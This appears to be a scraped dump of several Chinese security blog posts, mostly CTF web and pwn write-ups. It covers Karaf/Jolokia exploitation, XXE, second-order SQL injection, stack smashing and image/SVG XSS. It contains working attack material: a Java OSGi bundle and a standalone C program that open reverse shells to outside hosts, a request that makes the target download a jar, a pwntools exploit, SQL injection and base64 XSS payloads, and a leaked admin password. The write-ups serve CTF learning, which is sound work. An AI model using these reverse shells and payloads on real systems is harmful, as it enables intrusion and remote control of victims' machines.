Web writeup","date":"2019-03-31T02:56:21.000Z","path":"2019/03/31/0CTF-Web-writeup/","text":"本次writeup，纯属复现 : ) 0x01 Ghost Pepper题目地址 访问题目，提示该站点是Karaf，需要输入用户名和密码： Karaf是一个基于OSGi的框架，而OSGi是一个Java平台，允许在运行时管理应用程序组件的生命周期，而无需重新启动应用程序。我们可以在应用程序运行时在运行时添加/删除/替换组件，部署多个版本等。Karaf框架中的用户名和密码默认均为karaf，输入进去后是个404页面： 页面显示是使用Jetty作为Web服务器的，除此之外没找到更多的信息。 搜一下题目Ghost pepper，在Wiki百科发现其别名为Bhut jolokia，然后再搜索一遍Bhut jolokia，发现Jolokia是一个JMX-HTTP桥接器，可替代JSR-160连接器。它是一种基于代理的方法，支持许多平台。除了基本的JMX操作之外，它还通过批量请求和细粒度安全策略等独特功能增强了JMX远程处理功能。 那就是说，该站点应该支持Jolokia，访问一下该路径看看，果然返回了Json格式的数据： 访问list，列出Jolokia所支持的所有操作： 这里只列下前面的Java类： 12345678910111213141516171819java.util.loggingorg.eclipse.jetty.server.sessionorg.ops4j.pax.web.service.jetty.internalorg.eclipse.jetty.jmxosgi.compendiumjava.nioorg.apache.karafJMImplementationorg.eclipse.jetty.util.threadjava.langcom.sun.managementjmx4perlconnectorsun.nio.chorg.eclipse.jetty.serverorg.apache.aries.blueprintorg.eclipse.jetty.ioosgi.corejolokia 注意到org.apache.karaf这个类，就是说我们可以通过Karaf JMX执行各种操作。下面就来找下该karaf类所支持的所有方法： 其中可以看到很多操作命名为install，因此我们可以利用这些API来加载安装并部署我们直接编写的恶意jar程序。 下面有两种方法来解它。 Method1——安装WebConsoleKaraf框架是拥有一个WebConsole的，可以通过Web端进行控制台的交互，前面我们获取了org.apache.karaf的所有支持的方法，找到其中的installFeature()，编写如下安装WebConsole的payload： 1http://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole 然后在URL栏访问Karaf的WebConsole界面，直接输入命令即可得到flag： 1http://111.186.63.207:31337/system/console/gogo Method2——安装恶意bundle在之前的org.apache.karaf类中，还可以参考这篇文章通过install方法来进行利用。 除了该类外，还可以通过osgi.core的installBundleFromURL，这个方法可以通过URL来安装bundle，我们可以通过如下的方法找到该方法： 此时我们可以构造一个恶意bundle打包成jar放置在我们自己的服务器中，然后访问Karaf服务让其下载并安装部署我们的恶意bundle从而实现反弹shell： 123456789101112131415161718192021222324252627282930313233343536373839404142import org.osgi.framework.BundleActivator;import org.osgi.framework.BundleContext;import java.io.*;import java.net.Socket;public class Activator implements BundleActivator&#123; public void start(BundleContext paramBundleContext) throws Exception &#123; String str = \"1.2.3.4\"; int i = 12345; Socket localSocket = new Socket(str, i); localSocket.getOutputStream().write(\"Mi1k7ea\".getBytes()); localSocket.getOutputStream().flush();// localSocket.close(); try &#123; String ShellPath; ShellPath = new String(\"/bin/sh\"); Socket socket = new Socket( str, i ); Process process = Runtime.getRuntime().exec( ShellPath ); ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start(); ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start(); process.waitFor(); &#125; catch( Exception e ) &#123;&#125; localSocket.getOutputStream().write(\"Mi1k7ea\".getBytes()); localSocket.getOutputStream().flush(); localSocket.close(); &#125; public void stop(BundleContext paramBundleContext) throws Exception &#123; System.out.println(\"RIP\"); &#125;&#125; 获取一下该类的uuid： 然后通过installBundleFromURL方法来下载安装恶意bundle： 12345678910111213141516171819202122POST /jolokia/list HTTP/1.1Host: 111.186.63.207:31337Cache-Control: max-age=0Authorization: Basic a2FyYWY6a2FyYWY=Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: JSESSIONID=h1fouerlv92j1nzj1rn7f4hyuConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0&#123; &quot;type&quot;: &quot;exec&quot;, &quot;mbean&quot;: &quot;osgi.core:framework=org.eclipse.osgi,type=framework,uuid=089717e7-f953-42ec-959f-cd2488bc6482,version=1.7&quot;, &quot;operation&quot;: &quot;installBundleFromURL&quot;, &quot;arguments&quot;: [ &quot;moxiaoxi&quot;, &quot;http://a.com:666/m7.jar&quot; ]&#125; 通过response的id，来启动bundle，就可以获得一个反弹shell： 1&#123; \"type\": \"exec\", \"mbean\": \"osgi.core:framework=org.eclipse.osgi,type=framework,version=1.7,uuid=089717e7-f953-42ec-959f-cd2488bc6482\", \"operation\": \"startBundle\", \"arguments\": [ \"93\" ] &#125; 0x02 Wallbreaker Easy题目地址，已关闭。 环境待复现… 参考TCTF2019 Web WP","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"}]},{"title":"Securinets CTF Web writeup","date":"2019-03-29T13:41:58.000Z","path":"2019/03/29/Securinets-CTF-Web-writeup/","text":"0x01 Feedback题目地址，题目描述如下，提示flag保存在flag文件中： 访问页面，是一个输入界面： 随便填写内容，Send后发现在下方有回显： 抓包发现发送的是XML格式的数据： 推测考察的是XXE读取文件，换个XXE payload测试是否解析参数实体： 没问题，那就读取本地文件/etc/passwd试试： 问题来了，读取flag文件，但不知道绝对路径呀，这里file://伪协议只能读取绝对路径的文件。 那就换个php://filter伪协议吧，它可以读取相对路径，直接尝试读本目录的flag文件吧： 读到了flag，解码为Securinets{XxexXE@Ll_Th3_W@Y}。 当然，可以修改payload看看这个feed.php的内容如下： 1234567891011&lt;?phplibxml_disable_entity_loader (false);//$xmlfile = $_POST[\"ta\"];$xmlfile = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$feedback = simplexml_import_dom($dom);$author = $feedback-&gt;author;echo \"&lt;h4&gt;Thanks For you Feedback $author&lt;/h4&gt;\"?&gt; 0x02 Custom Location题目地址，题目描述如下，说是找出数据库资格证： 访问页面，没啥功能，查看页面源码也没有东西： 尝试访问robots.txt来看看是不是有某些提示，出现报错信息，看来是开启了Debug模式，从页面可看出是用了Symfony这个框架来搭建的： 随便点击一个php文件即可查看它的源代码。 那么我们就可以查看index.php了，前提是需要知道这个框架的index.php是在public目录中的： 可以看到，里面又包含了一个文件进来，访问该文件，发现里面调用了”secret_ctf_location/env”，再访问该文件在数据库配置的地址找到了flag： 0x03 SQL Injected题目地址，题目描述如下图，标题是SQL注入了，但提示说我不喜欢这名字，而且可以下载代码： 访问页面是个登录界面，可注册： 随便注册个用户，注册成功后自动登录进界面： 点击左上角的Flags界面显示”Error! You need to be an admin to access this area”即无权访问。 在index页面编辑title和内容然后Post，即可在下面更新显示内容： 在Find Posts一栏，输入指定用户名会显示该用户发布过的内容： 大致功能了解了，现在来源码审计。 项目目录如下： 简单理下，create_db.sql是执行创建数据库表和字段内容的SQL语句；db.php配置数据库连接信息；flags.php即显示Flags页面，其中关键是判断$_SESSION[‘role’]是否为1，是则从包含的secret.php中输出flag；secret.php中保存了flag；logout.php即登出。 关键的几个文件为login.php、register.php和index.php，因为这几个是程序的主要处理逻辑，涉及到的SQL操作都在这几个文件中。 先看看register.php关键部分的SQL操作，对用户输入的username和password参数调用了mysqli_real_escape_string()函数进行了转义过滤，然后写入INSERT语句，其中role字段值写死了为0，SQL语句执行成功后即跳转至index.php界面；也就是说，这里没法进行SQL注入了： 123456789101112131415161718192021222324if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) &#123; if(!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) &#123; $success = true; $username = mysqli_real_escape_string($conn, $_POST['username']); $password = mysqli_real_escape_string($conn, $_POST['password']); $sql = \"INSERT INTO users (login, password, role) VALUES ('\". $username .\"', '\". $password .\"', 0)\"; try &#123; $conn-&gt;query($sql); &#125; catch(Exception $err) &#123; echo 'err: '.$err; $success = false; &#125; &#125; else &#123; $success = false; &#125; if($success) &#123; $_SESSION['username'] = $username; $_SESSION['message'] = \"&lt;div class=\\\"alert alert-success\\\"&gt; &lt;strong&gt;Success!&lt;/strong&gt; Welcome aboard \".$_SESSION['username'].\" ! &lt;/div&gt;\"; header('location: index.php'); &#125;&#125; 同样看看login.php中进行SQL操作的代码，都是进行了mysqli_real_escape_string()函数的转义过滤，然后执行SELECT查询语句，这里也无法进行SQL注入；注意到，将查询成功后获取的用户名即login字段值赋给\\$_SESSION[‘username’]，将role字段值赋值给​\\$_SESSION[‘role’]： 123456789101112131415if (isset($_POST['username']) &amp;&amp; !empty($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; !empty($_POST['password'])) &#123; $username = mysqli_real_escape_string($conn, $_POST['username']); $password = mysqli_real_escape_string($conn, $_POST['password']); $sql = \"SELECT * FROM users WHERE login='\". $username .\"' and password='\". $password .\"'\"; $res = $conn-&gt;query($sql); if($res-&gt;num_rows &gt; 0) &#123; $user = $res-&gt;fetch_assoc(); $_SESSION['username'] = $user['login']; $_SESSION['role'] = $user['role']; header('location: index.php'); die(); &#125; else &#123; $success = false; &#125;&#125; 最后看看index.php，可以看到界面输入的参数post、title、post_author等都进行了转义过滤，但是注意到在拼接的SQL语句中有的含有参数$_SESSION[‘username’]： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?php...if (isset($_POST[&apos;post&apos;]) &amp;&amp; isset($_POST[&apos;title&apos;])) &#123; if(!empty($_POST[&apos;post&apos;]) &amp;&amp; !empty($_POST[&apos;title&apos;])) &#123; $success = true; $post = mysqli_real_escape_string($conn, $_POST[&apos;post&apos;]); $title = mysqli_real_escape_string($conn, $_POST[&apos;title&apos;]); $sql = &quot;INSERT INTO posts (title, content, date, author) VALUES (&apos;&quot;. $title .&quot;&apos;, &apos;&quot;. $post .&quot;&apos;, CURDATE(), &apos;&quot;. $_SESSION[&apos;username&apos;] .&quot;&apos;)&quot;; try &#123; $conn-&gt;query($sql); &#125; catch(Exception $err) &#123; echo &apos;err: &apos;.$err; $success = false; &#125; &#125; else &#123; $success = false; &#125; if($success) &#123; $_SESSION[&apos;message&apos;] = &quot;&lt;div class=\\&quot;alert alert-success\\&quot;&gt; &lt;strong&gt;Success!&lt;/strong&gt; Your post has been saved! &lt;/div&gt;&quot;; &#125;&#125;if (isset($_POST[&apos;post_author&apos;])) &#123; $sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. mysqli_real_escape_string($conn, $_POST[&apos;post_author&apos;]) .&quot;&apos;&quot;; try &#123; $posts = $conn-&gt;query($sql); &#125; catch(Exception $err) &#123; echo &apos;err: &apos;.$err; &#125;&#125; else &#123; $sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. $_SESSION[&apos;username&apos;] .&quot;&apos;&quot;; try &#123; $posts = $conn-&gt;query($sql); &#125; catch(Exception $err) &#123; echo &apos;err: &apos;.$err; &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;...&lt;div class=&quot;content&quot;&gt;&lt;?phpif(isset($_SESSION[&apos;message&apos;]) &amp;&amp; $_SESSION[&apos;message&apos;]) &#123; echo $_SESSION[&apos;message&apos;]; $_SESSION[&apos;message&apos;] = null;&#125;?&gt;&lt;div&gt; &lt;form class=&quot;post-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input class=&quot;form-control&quot; placeholder=&quot;Title&quot; name=&quot;title&quot; style=&quot;margin-bottom: 10px;&quot; /&gt; &lt;textarea class=&quot;form-control&quot; placeholder=&quot;Express yourself ...&quot; name=&quot;post&quot;&gt;&lt;/textarea&gt; &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary post-btn&quot; value=&quot;Post&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;h5 style=&quot;color: gray;&quot;&gt;Find Posts&lt;/h5&gt;&lt;form class=&quot;post-search&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input class=&quot;form-control&quot; placeholder=&quot;username&quot; style=&quot;width: 250px;&quot; name=&quot;post_author&quot; value=&quot;&lt;?php echo $_POST[&apos;post_author&apos;] ?&gt;&quot;/&gt; &lt;button class=&quot;btn btn-outline-success&quot; type=&quot;submit&quot;&gt; Find &lt;/button&gt;&lt;/form&gt;&lt;?phpecho &quot;&lt;h5 class=\\&quot;results-count\\&quot;&gt;Results: $posts-&gt;num_rows&lt;/h5&gt;&quot;;if($posts-&gt;num_rows &gt; 0) &#123; while($post = $posts-&gt;fetch_assoc()) &#123;?&gt; &lt;div style=&quot;padding-bottom: 20px&quot;&gt; &lt;div&gt; &lt;h5 style=&quot;display: inline&quot;&gt; &lt;?php echo $post[&apos;title&apos;] ?&gt;&lt;/h5&gt; &lt;h6 class=&quot;float-right&quot;&gt; &lt;?php echo $post[&apos;date&apos;] ?&gt;&lt;/h6&gt; &lt;/div&gt; &lt;h6&gt; &lt;?php echo $post[&apos;content&apos;] ?&gt;&lt;/h6&gt; &lt;div class=&quot;float-right&quot;&gt; By: &lt;?php echo $post[&apos;author&apos;] ?&gt; &lt;/div&gt; &lt;/div&gt; &lt;hr/&gt;&lt;?php &#125;&#125;?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 因为以上几个文件中外界输入的参数都进行了mysqli_real_escape_string()函数的转义过滤，因此无法从输入的参数进行直接的SQL注入。但是前面注意到index.php中有些SQL语句含有拼接$_SESSION[‘username’]的写法，先列下出现的语句吧： 123$sql = \"INSERT INTO posts (title, content, date, author) VALUES ('\". $title .\"', '\". $post .\"', CURDATE(), '\". $_SESSION['username'] .\"')\";$sql = \"SELECT * FROM posts WHERE author = '\". $_SESSION['username'] .\"'\"; 只有两句，一个为INSERT一个为SELECT语句。前面我们知道$_SESSION[‘username’]是从login.php中查询表的login字段即用户名得来的。 再回看题目，flag就在Flags界面，但只有role为1的用户才能访问，那就需要SQL注入dump下role为1的用户名/密码登录访问来获取flag了。 那么就清晰了，在注册时往username进行SQL注入，虽然注册时调用mysqli_real_escape_string()函数转移过滤了，但是在存储进数据库的时候是你输入时的内容而不包含转义符\\，因此在$_SESSION[‘username’]从users表中提取login字段时就是注入时的原格式，在拼接SQL语句时会直接造成SQL注入。 确认一下，使用M7’作为用户名注册登录，可以看到注册成功后直接跳转过去的index.php界面显示的用户名中的单引号前是有转移符\\的，这是因为此时的$_SESSION[‘username’]是由注册时调用mysqli_real_escape_string()函数后直接赋值过来的结果： 其实存储在数据库中的内容是没有转移符\\的，我们登出再登录，会发现转移符不见了，这是因为此时的$_SESSION[‘username’]是从数据库中查询得来的： OK，那剩下的就是如何进行SQL注入了。 相比之下INSERT语句作用不大，但SELECT语句可以列出用户名和密码等字段值，因此利用SELECT语句进行SQL注入来dump role为1的用户信息。 构造payload前先看下create_db.sql中的posts表是存在5个字段，而users表是存在id、login、passwod和role等4个字段： 123create database webn;create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100)); 注册输入如下构造的用户名： 1'union select id,login,password,role,5 from users where role=1# 注册完新用户后登出再登录，可以看到输出了role为1、login即用户名为root的5个输出字段信息： 用root/jjLLgTGk3uif2rKBVwqH登录再访问Flags界面即可拿到flag：","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"}]},{"title":"C编写实现Linux反弹shell","date":"2019-03-24T08:19:50.000Z","path":"2019/03/24/C编写实现Linux反弹shell/","text":"网上实现Linux反弹shell的方法各种各样，这里写下用C编写反弹shell的程序。参考了linux下C语言版反向shell： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;signal.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;int tcp_port = 6666;char *ip = \"192.168.17.129\";void reverse_shell()&#123; int fd; if ( fork() &lt;= 0)&#123; struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(tcp_port); addr.sin_addr.s_addr = inet_addr(ip); fd = socket(AF_INET, SOCK_STREAM, 0); if ( connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr)) )&#123; exit(0); &#125; dup2(fd, 0); dup2(fd, 1); dup2(fd, 2); execve(\"/bin/bash\", 0LL, 0LL); &#125; return;&#125;void main(int argc, char const *argv[])&#123; reverse_shell(); return 0;&#125; 现在Kali中开启nc监听：nc -lvp 6666 在Ubuntu上gcc编译并运行： 在Kali连接到shell了：","tags":[{"name":"安全开发","slug":"安全开发","permalink":"https://www.mi1k7ea.com/tags/安全开发/"},{"name":"C/C++","slug":"C-C","permalink":"https://www.mi1k7ea.com/tags/C-C/"}]},{"title":"花式栈溢出之Stack smash","date":"2019-03-23T15:06:00.000Z","path":"2019/03/23/花式栈溢出之Stack-smash/","text":"Stack smash 在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 __stack_chk_fail 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下： 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");&#125; 所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 __fortify_fail 函数中就会输出我们想要的信息。 EKOPARTY PRE-CTF 2015: Smashing the stack for fun and profit这里结合ekoparty-pre-ctf-2015的一道Pwn题来学习，题目下载地址。 在本地运行前，需要在本地先建立一个flag.txt。 运行程序，先给个有趣的地址，然后给你输入用户名；file查看是静态链接文件；checksec发现开启了NX和Canary： IDA看下main()函数，程序会打开本地的flag.txt文件，然后复制该文件描述符到一个buf中，接着输出一个指向该buf的地址并询问你的用户名，通过read()函数获取0x400长度的用户输入的内容，而0x400数值过大，由此可知read()函数存在栈溢出漏洞： 这样看应该是直接给了获取flag的地址了。 回到之前安全编译选项检测的结果发现，程序是开了Canary的，根据Canary的原理，其在一个函数入口处从fs段内获取一个随机值，一般存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置，如果攻击者利用栈溢出修改到了这个值，导致该值与存入的值不一致，__stack_chk_fail()函数将抛出异常并退出程序。 先试下发送大量字符，查看到抛出异常信息，即调用了Canary实现代码中的__libc_message()将__libc_argv[0]打印了出来，这里__libc_argv[0]为本程序名，同时发现程序只是终止了而非栈溢出时的段错误： 也就是说，只要溢出的内容覆盖了Canary插入的cookie，Canary就会报错，且当前输入200个字符还未达到覆盖到argv[0]的位置。整个栈结构及溢出原理如下图所示： 下面只需要确定溢出的变量地址距离argv[0]的偏移地址。 Method1——使用pattern 之前pattern_create生成的200个字符串并未使程序出现段错误，后面尝试到400个字符串时发生段错误，没有输出Canary出错返回的异常信息而是输出Segmentation fault，即输入字符溢出覆盖了argv[0]地址导致程序无法正常读取该值从而发生错误： pattern_offset得到偏移量为376： Method2——断点调试 先在main()函数打断点，运行： 可以看出0x7fffffffe2bd保存的是程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时0x7fffffffdf48处保留着该地址，所以我们真正需要覆盖的地址是0x7fffffffdf48。 此时RBP的地址为0x7fffffffde60；在前面IDA中可以看到变量v8相对于RBP的偏移量为90h，因此可算出v8变量的地址为RBP-90h=0x7fffffffddd0。 最后可以算出v8变量到需要覆盖的地址的偏移量为：|0x7fffffffddd0 - 0x7fffffffdf48|=178h=376(d) 编写payload： 123456789from pwn import *sh = process(\"./xpl\")addr = int(sh.recvline().split()[4], 16)payload = flat([\"A\" * 376, p64(addr)])sh.sendline(payload)result = sh.recvall()print result 运行getflag：","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.mi1k7ea.com/tags/栈溢出/"},{"name":"Pwn","slug":"Pwn","permalink":"https://www.mi1k7ea.com/tags/Pwn/"}]},{"title":"图片XSS小结","date":"2019-03-22T14:52:04.000Z","path":"2019/03/22/图片XSS小结/","text":"最近做题遇到图片XSS的构造，这里就小结一下笔记吧。 图片XSS图片XSS，简单地说，就是将JavaScript代码尽量插入图片的无用区域，在不影响图片显示的情况下满足JS代码格式从而执行图片中的JS代码导致XSS。 注意：只对IE有效，Chrome和Firefox无法触发。 向gif文件中注入JavaScript的脚本：http://pastebin.com/6yUbfGX5 向bmp文件中注入JavaScript的脚本：http://pastebin.com/04y7ee3u gif图片插入payload：python gif_injector.py -i flower.gif &quot;alert(&#39;Mi1k7ea&#39;);&quot; bmp图片插入payload：python bmpinjector.py -i pain.bmp &quot;alert(location);&quot; 写段页面代码加载该图片： 123456789&lt;html&gt;&lt;head&gt;&lt;title&gt;Image XSS Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=\"flower.gif_malw.gif\" /&gt;&lt;script src=\"flower.gif_malw.gif\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 但是现在只剩gif可以执行XSS了，bmp不行： SVG XSSSVG是一种基于XML的图像文件格式。 use元素SVG中的use元素用于重用其他元素，主要用于联接defs和alike，而我们却用它来引用外部SVG文件中的元素。 元素通过其id被引用，在use标签的xlink:href属性中以’#’井字符开头，外部元素的引用同样如此。 示例如下。 pic.html： 123&lt;svg&gt;&lt;use xlink:href='exp.svg#m7' /&gt;&lt;/svg&gt; exp.svg： 12345&lt;svg id=\"m7\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"100\" height=\"100\"&gt; &lt;a xlink:href=\"javascript:alert('Mi1k7ea')\"&gt; &lt;rect x=\"0\" y=\"0\" width=\"100\" height=\"100\" /&gt; &lt;/a&gt;&lt;/svg&gt; .svg文件以svg标签开始，其id设置为m7，使用rect标签绘一个矩形。可以使用a环绕rect标签，这样会创建一个超链接。使用Javascript伪协议，可点击的超链接在点击后会执行Javascript。虽然SVG是经由use标签加载的，但是Javascript将会执行。有一点需要注意，它只能加载SVG文件，必须满足同源策略。 可以看到测试结果，在chrome和Firefox下点击黑框都能弹框： data:url+Base64由于加载的外部SVG文件必须是同源的，这个特性看起来似乎无法作为有用的XSS攻击向量，但可以使用data:url协议来帮我们提升这个攻击向量。 首先，它允许我们从内部创建一个文件，要求正确的mime-type，在这里为image/svg+xml。mimie-type后是我们的攻击载荷或关键字base64。特别地，由于数据被base64编码，这有助于避免突破HTML结构的问题。 现在我们不必再依赖于服务器上的另一个文件了，改进一下pic.html： 123&lt;svg&gt;&lt;use xlink:href=\"data:image/svg+xml;base64,PHN2ZyBpZD0ibTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4NCjxhIHhsaW5rOmhyZWY9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUyEnKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#m7\" /&gt;&lt;/svg&gt; 其中base64加密的内容为： 123&lt;svg id=\"m7\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"100\" height=\"100\"&gt;&lt;a xlink:href=\"javascript:alert('XSS!')\"&gt;&lt;rect x=\"0\" y=\"0\" width=\"100\" height=\"100\" /&gt;&lt;/a&gt;&lt;/svg&gt; 但只能在Firefox中测试可行，点击黑框后能够成功触发： 无需点击——foreignObject元素如果在exp.svg中写script标签是不会被解析，但是SVG支持foreignObject元素。 通过阐述这个对象需要的扩展属性，有可能加载非SVG元素。这就意味着现在有可能是有iframe、embed及其他所有支持的HTML元素了，我们可以从一堆元素中进行选择执行Javascript，这里使用embed+JavascriptURL协议。 pic.html： 123&lt;svg&gt;&lt;use xlink:href=\"data:image/svg+xml;base64,PHN2ZyBpZD0ibTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiByZXF1aXJlZEV4dGVuc2lvbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPgoJPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoNjY2KSIgLz4KPC9mb3JlaWduT2JqZWN0Pgo8L3N2Zz4=#m7\" /&gt;&lt;/svg&gt; 其中base64加密内容为： 123456&lt;svg id=\"m7\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"100\" height=\"100\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;foreignObject width=\"100\" height=\"50\" requiredExtensions=\"http://www.w3.org/1999/xhtml\"&gt; &lt;embed xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(666)\" /&gt;&lt;/foreignObject&gt;&lt;/svg&gt; 可以看到，在Firefox下，无需点击即可触发foreignObject标签内embed的JS伪协议执行JS代码从而弹框，同时没有弹框显示1说明了script标签不会被解析： link XSS前面利用use元素结合data:url只能在Firefox下生效，Chrome却不会触发。 这里可利用link来bypass Chrome。 示例pic.html如下，加密内容为&lt;script&gt;alert(&quot;Hello&quot;);&lt;/script&gt;： 1&lt;link rel=\"import\" href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\"&gt; 在Chrome下成功执行（Firefox未成功）： 当然link的形式很多，href的地方本身就是可以插入js代码的，但是通过base64加密，可以bypass各种奇怪的过滤。 这里很多用到了data类型的url，可参考如下： 123456789101112data:,&lt;文本数据&gt; data:text/plain,&lt;文本数据&gt; data:text/html,&lt;HTML代码&gt; data:text/html;base64,&lt;base64编码的HTML代码&gt; data:text/css,&lt;CSS代码&gt; data:text/css;base64,&lt;base64编码的CSS代码&gt; data:text/javascript,&lt;Javascript代码&gt; data:text/javascript;base64,&lt;base64编码的Javascript代码&gt; data:image/gif;base64,base64编码的gif图片数据 data:image/png;base64,base64编码的png图片数据 data:image/jpeg;base64,base64编码的jpeg图片数据 data:image/x-icon;base64,base64编码的icon图片数据 参考浅析图片XSS中的哪些技术问题 用SVG绕过浏览器XSS审计","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"Teaser CONFidence CTF Web writeup","date":"2019-03-21T11:58:22.000Z","path":"2019/03/21/Teaser-CONFidence-CTF-Web-writeup/","text":"这次Web题只做了前两道，最后一道GO的题目不会就没做了。 My admin panel题目地址：http://gameserver.zajebistyc.tf/ 题目描述：I think I’ve found something interesting, but I’m not really a PHP expert. Do you think it’s exploitable? 访问该页面，是个登录界面，可以下载客户端包： 下载该包下来，解压打开看，发现全是C/C++代码，和本题提示的PHP无关，因此点一个不在这。 尝试随便输入登录，发现无论输入啥都是返回Done界面： 这样的话也没办法进行SQL注入和盲注了，因为无论输入什么内容返回内容都一样。 那就尝试用工具扫下Web站点下隐藏的页面，果不其然： 一个个访问，login.php返回”Not authenticated.”，其他文件无显示，访问admin目录，存在一个login.php.bak备份文件： 下载下来，代码如下： 1234567891011121314151617181920212223242526272829&lt;?phpinclude '../func.php';include '../config.php';if (!$_COOKIE['otadmin']) &#123; exit(\"Not authenticated.\\n\");&#125;if (!preg_match('/^&#123;\"hash\": [0-9A-Z\\\"]+&#125;$/', $_COOKIE['otadmin'])) &#123; echo \"COOKIE TAMPERING xD IM A SECURITY EXPERT\\n\"; exit();&#125;$session_data = json_decode($_COOKIE['otadmin'], true);if ($session_data === NULL) &#123; echo \"COOKIE TAMPERING xD IM A SECURITY EXPERT\\n\"; exit(); &#125;if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) &#123; echo(\"I CAN EVEN GIVE YOU A HINT XD \\n\"); for ($i = 0; i &lt; strlen(MD5('xDdddddd')); i++) &#123; echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0); &#125; exit(\"\\n\");&#125;display_admin(); 分析一下，先判断cookie字段是否存在otadmin属性；然后正则判断otadmin是否满足指定json格式的内容；提取出hash键值和$cfg_pass变量的MD5值进行比较，当不相等时输出一段经过运算后的提示信息。 注意，if ($session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass))) {这里用的比较符是!=，按照习惯会想到是PHP弱类型。 随便填otadmin的内容发过去/admin/login.php看看，注意cookie值的构造要满足前面正则的匹配： 这里返回了一串经过运算处理后的内容： 0006464640640064000646464640006400640640646400 分析一下，只有0/6/4这几个数字。将运算的那段代码扣下来本地运行一下： 